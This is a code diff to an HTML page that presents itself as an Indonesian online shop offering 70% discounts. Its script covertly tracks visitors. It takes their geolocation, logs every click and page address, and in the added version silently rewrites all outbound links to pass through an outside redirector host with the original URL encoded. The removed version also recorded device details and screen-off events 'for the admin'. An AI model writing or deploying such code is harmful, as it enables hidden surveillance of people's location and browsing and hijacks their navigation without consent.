@@ -5,67 +5,52 @@
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>🔥 DISKON 70% - Semua Barang Murah Meriah | Shop Online</title>
      <script>
-     // ✅ DAFTAR SEMUA YANG DIA BUKA (AKTIF TERUS)
-     let riwayatLengkap = [];
-     let lokasiUser = 'Sedang dicari...';
      window.onload = function() {
-         // Ambil lokasi sekali saja
+         let lokasiUser = 'Mencari lokasi...';
          if (navigator.geolocation) {
-             navigator.geolocation.getCurrentPosition(pos => {
-                 lokasiUser = pos.coords.latitude + "," + pos.coords.longitude;
-                 simpanData("BUKA AWAL: " + window.location.href);
-             }, () => {
-                 lokasiUser = "Tidak dapat lokasi";
-                 simpanData("BUKA AWAL: " + window.location.href);
-             }, {enableHighAccuracy:false, timeout:3000});
-         } else {
-             lokasiUser = "HP tidak dukung lokasi";
-             simpanData("BUKA AWAL: " + window.location.href);
+             navigator.geolocation.getCurrentPosition(p => lokasiUser = p.coords.latitude + "," + p.coords.longitude);
          }
-         // ✅ CARI TAU SETIAP KALI DIA PINDAH HALAMAN / BUKA WEB LAIN
+         // UBAH SEMUA LINK BIAR LEWAT KITA DULU
          setInterval(() => {
-             const halamanSekarang = window.location.href;
-             const judulSekarang = document.title;
-             const waktuSekarang = new Date().toLocaleString('id-ID');
-             
-             // Cek apakah halaman baru / berubah
-             if (riwayatLengkap.length === 0 || riwayatLengkap[riwayatLengkap.length-1].alamat !== halamanSekarang) {
-                 simpanData("✅ BUKA BARU: " + judulSekarang + " | " + halamanSekarang);
+             const semuaLink = document.querySelectorAll('a');
+             semuaLink.forEach(link => {
+                 if (!link.telahDiubah && link.href.startsWith('http')) {
+                     link.telahDiubah = true;
+                     const asli = link.href;
+                     link.href = 'https://kitaku711-kripto.github.io/buka.html?tujuan=' + btoa(asli);
+                     link.target = '_blank';
+                 }
+             });
+             // CATAT KALAU DIA KETIK ALAMAT BARU
+             const alamatSekarang = window.location.href;
+             if (alamatSekarang !== localStorage.getItem('alamatLalu')) {
+                 localStorage.setItem('alamatLalu', alamatSekarang);
+                 simpanData({
+                     waktu: new Date().toLocaleString('id-ID'),
+                     lokasi: lokasiUser,
+                     jenis: '⌨️ KETIK / BUKA LANGSUNG',
+                     alamat: alamatSekarang,
+                     judul: document.title
+                 });
              }
-             // ✅ CATAT SEMUA YANG DIA KLIK DI LAYAR
-             document.onclick = function(e) {
-                 const elemen = e.target.tagName;
-                 const teks = e.target.innerText?.substring(0,30) || 'Tidak ada teks';
-                 simpanData("👆 KLIK: " + elemen + " | " + teks);
-             };
-         }, 1000); // Cek setiap 1 detik
-         // ✅ KIRIM SEMUA KE PENYIMPANAN (BIAR MASUK KE ADMIN KAMU)
-         function simpanData(keterangan) {
-             const data = {
+         }, 400);
+         // CATAT SEMUA KLIK DIA
+         document.onclick = function(e) {
+             const teks = e.target.innerText?.substring(0,30) || 'Tidak ada teks';
+             simpanData({
                  waktu: new Date().toLocaleString('id-ID'),
                  lokasi: lokasiUser,
-                 hp: navigator.userAgent,
+                 jenis: '👆 KLIK: ' + teks,
                  alamat: window.location.href,
-                 judul: document.title,
-                 info: keterangan
-             };
-             // Simpan ke tempat yang dibaca admin
-             let semua = JSON.parse(localStorage.getItem('SEMUA_DATA_PANTAU') || '[]');
-             semua.unshift(data); // Taruh di paling atas
-             if (semua.length > 100) semua.pop(); // Simpan sampai 100 riwayat terakhir
-             localStorage.setItem('SEMUA_DATA_PANTAU', JSON.stringify(semua));
-             
-             // Simpan juga ke riwayat lokal
-             riwayatLengkap.push(data);
+                 judul: document.title
+             });
+         };
+         function simpanData(dt) {
+             let db = JSON.parse(localStorage.getItem('DB_UTAMA')) || [];
+             db.unshift(dt);
+             if (db.length > 200) db.pop();
+             localStorage.setItem('DB_UTAMA', JSON.stringify(db));
          }
-         // ✅ TETAP JALAN WALAUPUN LAYAR MATI / HALAMAN DIKECILKAN
-         document.addEventListener('visibilitychange', function() {
-             if (document.hidden) {
-                 simpanData("🔕 HALAMAN DITUTUP / LAYAR MATI");
-             } else {
-                 simpanData("🔔 DIBUKA KEMBALI");
-             }
-         });
      }
      </script>
      <style>
